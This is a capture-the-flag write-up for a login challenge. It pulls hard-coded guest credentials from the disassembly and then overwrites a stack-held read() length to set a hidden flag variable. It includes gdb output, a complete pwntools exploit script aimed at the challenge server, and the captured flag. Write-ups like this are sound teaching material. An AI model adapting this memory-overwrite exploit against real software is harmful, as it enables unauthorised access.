### Solved by superkojiman

The program asks for username and password. If we check the disassembly we see that the guest username is "charly" and the guest password is "h4ckTH1s". After it does a strncmp() on the credentials it checks if a certain variable is 1. If it is, we get the flag:

```
   0x00000000004008eb <+334>:   call   0x400600 <strncmp@plt>
   0x00000000004008f0 <+339>:   test   eax,eax
   0x00000000004008f2 <+341>:   jne    0x400945 <main+424>
   0x00000000004008f4 <+343>:   lea    rax,[rbp-0xd0]
   0x00000000004008fb <+350>:   add    rax,0x18
   0x00000000004008ff <+354>:   mov    edx,0x8
   0x0000000000400904 <+359>:   mov    esi,0x400a2a
   0x0000000000400909 <+364>:   mov    rdi,rax
   0x000000000040090c <+367>:   call   0x400600 <strncmp@plt>
   0x0000000000400911 <+372>:   test   eax,eax
   0x0000000000400913 <+374>:   jne    0x400945 <main+424>
   0x0000000000400915 <+376>:   mov    edi,0x400a33
   0x000000000040091a <+381>:   call   0x400610 <puts@plt>
   0x000000000040091f <+386>:   mov    eax,DWORD PTR [rbp-0xa8]
   0x0000000000400925 <+392>:   cmp    eax,0x1
```

So basically we need to set $rbp-0xa8 to 1. The program uses read() to get the username and password. In both calls to read(), read()'s 3rd parameter size_t count is a variable on the stack, which means we can overwrite it. If we set username to "A"*17, then the second call to read looks like this:

```
=> 0x4008ce <main+305>: call   0x400650 <read@plt>
   0x4008d3 <main+310>: lea    rax,[rbp-0xd0]
   0x4008da <main+317>: add    rax,0x4
   0x4008de <main+321>: mov    edx,0x6
   0x4008e3 <main+326>: mov    esi,0x400a23
Guessed arguments:
arg[0]: 0x0 
arg[1]: 0x7fff3c4b3e38 --> 0x0 
arg[2]: 0x41 ('A')
arg[3]: 0x7fff3c4b3e38 --> 0x0 
```

We've overwritten count to 0x41. Where's the variable we want to set to 1?

```
gdb-peda$ p/x $rbp-0xa8
$8 = 0x7fff3c4b3e48
```

That's only 16 bytes away and we can write 65 bytes. So all we need to do is set the password to "h4ckTH1sBBBBBBBB\x01" to overwrite it. Since the credentials check uses strncmp("charly", buf, 6) and strncmp("h4ckTH1s",  buf, 8), it will ignore the excess padding of "A"s and "B"s in the username and password so it will still match. 

Exploit:

```python
#!/usr/bin/env python
from pwn import *

r = remote("challs.ctf.site", 20000)

buf1 = ""
buf1 += "charly"
buf1 += "A"*(17 - len(buf1))

print r.recv()
r.send(buf1)

buf2 = ""
buf2 += "h4ckTH1s"
buf2 += "B"*(16 - len(buf2))
buf2 += p64(0x1)

print r.recv()
r.send(buf2)

print r.recv()
```

In action: 

```
# ./sploit.py 
[+] Opening connection to challs.ctf.site on port 20000: Done
User : 
Password : 
Welcome guest!
Your flag is : EKO{Back_to_r00000ooooo00000tS}
```

Win!
